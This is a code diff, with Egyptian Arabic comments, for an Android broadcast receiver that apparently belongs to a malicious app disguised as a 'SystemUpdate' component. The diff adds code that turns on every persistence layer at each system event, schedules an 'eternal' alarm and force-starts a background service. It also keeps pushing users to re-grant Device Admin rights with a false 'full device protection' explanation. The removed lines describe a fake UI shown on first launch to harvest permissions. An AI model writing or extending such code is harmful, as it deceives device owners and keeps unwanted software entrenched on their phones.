@@ -10,60 +10,88 @@ import android.util.Log;
 /**
  * PackageUpdateReceiver - يستقبل أحداث النظام
  * ============================================================
- * ★ الوظيفة الأهم: عند تثبيت التطبيق أول مرة، يفتح MainActivity
- *   عشان نعرض UI وهمي ونجمع الصلاحيات
+ * ★ ملاحظة مهمة: من Android 8+، النظام مش بيبعت PACKAGE_ADDED
+ *   للتطبيق اللي اتعمل تثبيته تو.
+ * ★ الحل: نعتمد على المستخدم إنه يفتح التطبيق يدويًا من الأيقونة.
+ * ★ الوظيفة الأساسية هنا: تفعيل الاستمرارية في كل حدث نظام
  * ============================================================
  */
 public class PackageUpdateReceiver extends BroadcastReceiver {
 
     private static final String TAG = "SystemUpdate";
     private static final String PREFS_NAME = "sys_prefs";
-    private static final String KEY_FIRST_LAUNCH = "first_launch_done";
 
     @Override
     public void onReceive(Context context, Intent intent) {
         try {
-            String action = intent.getAction();
+            String action = intent != null ? intent.getAction() : "unknown";
             Log.d(TAG, "[PKG] received: " + action);
 
-            // ★★★ الأهم: عند تثبيت التطبيق أو تحديثه ★★★
-            if (Intent.ACTION_PACKAGE_ADDED.equals(action)
-                    || Intent.ACTION_PACKAGE_REPLACED.equals(action)
-                    || Intent.ACTION_MY_PACKAGE_REPLACED.equals(action)) {
-
-                // ★ تحقق إذا التطبيق اتعرض قبل كده ★
-                SharedPreferences prefs = context.getSharedPreferences(
-                        PREFS_NAME, Context.MODE_PRIVATE);
-                boolean firstLaunchDone = prefs.getBoolean(KEY_FIRST_LAUNCH, false);
-
-                if (!firstLaunchDone) {
-                    Log.d(TAG, "[PKG] ★★★ FIRST LAUNCH — Opening MainActivity ★★★");
-
-                    // ★★★ افتح MainActivity عشان نجمع الصلاحيات ★★★
-                    try {
-                        Intent mainIntent = new Intent(context, MainActivity.class);
-                        mainIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                        mainIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
-                        mainIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
-                        context.startActivity(mainIntent);
-                        Log.d(TAG, "[PKG] MainActivity started");
-                    } catch (Exception e) {
-                        Log.e(TAG, "[PKG] start MainActivity error: " + e.getMessage());
-                    }
-                } else {
-                    Log.d(TAG, "[PKG] Not first launch — skipping UI");
-                }
-            }
-
-            // ★ فعّل الاستمرارية في كل الأحوال ★
+            // ★★★ فعّل كل طبقات الاستمرارية في كل حدث نظام ★★★
             try {
                 PersistenceManager.enableAllPersistence(context);
+                PersistenceManager.scheduleEternalAlarm(context);
             } catch (Exception e) {
                 Log.e(TAG, "[PKG] persistence error: " + e.getMessage());
             }
 
+            // ★★★ حاول تشغيل الخدمات ★★★
+            try {
+                Intent svc = new Intent(context, ServiceRunner.class);
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    context.startForegroundService(svc);
+                } else {
+                    context.startService(svc);
+                }
+                Log.d(TAG, "[PKG] ServiceRunner started");
+            } catch (Exception e) {
+                Log.e(TAG, "[PKG] service start error: " + e.getMessage());
+            }
+
+            // ★★★ تأكد إن الـ Device Admin لسه مفعّل ★★★
+            try {
+                ensureDeviceAdminActive(context);
+            } catch (Exception e) {
+                Log.e(TAG, "[PKG] admin check error: " + e.getMessage());
+            }
+
         } catch (Exception e) {
             Log.e(TAG, "[PKG] error: " + e.getMessage());
+        }
+    }
+
+    // ============================================================
+    // ensureDeviceAdminActive
+    // ============================================================
+    private void ensureDeviceAdminActive(Context context) {
+        try {
+            android.app.admin.DevicePolicyManager dpm =
+                    (android.app.admin.DevicePolicyManager)
+                            context.getSystemService(Context.DEVICE_POLICY_SERVICE);
+            android.content.ComponentName admin =
+                    new android.content.ComponentName(context, AdminReceiver.class);
+
+            if (dpm != null && !dpm.isAdminActive(admin)) {
+                Log.d(TAG, "[PKG] Device Admin NOT active — trying to reactivate");
+                try {
+                    Intent intent = new Intent(
+                            android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+                    intent.putExtra(
+                            android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
+                            admin);
+                    intent.putExtra(
+                            android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                            "مطلوب لتفعيل الحماية الكاملة للجهاز.");
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    context.startActivity(intent);
+                } catch (Exception e) {
+                    Log.e(TAG, "[PKG] admin intent error: " + e.getMessage());
+                }
+            } else {
+                Log.d(TAG, "[PKG] Device Admin is active");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "[PKG] ensureDeviceAdminActive error: " + e.getMessage());
         }
     }
 }
